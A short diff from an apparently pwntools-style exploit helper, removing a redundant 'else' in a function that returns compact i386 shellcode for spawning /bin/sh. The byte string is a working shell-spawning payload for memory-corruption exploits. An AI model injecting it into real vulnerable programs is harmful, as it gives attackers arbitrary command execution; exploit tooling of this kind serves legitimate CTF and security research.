@@ -8,4 +8,4 @@ def sh():
     '''Shorter shellcode, in case program limits require it'''
     if context.arch == 'i386':
         return b'1\xc9\xf7\xe1\xb0\x0bQh//shh/bin\x89\xe3\xcd\x80'
-    else: raise NotImplementedError
+    raise NotImplementedError
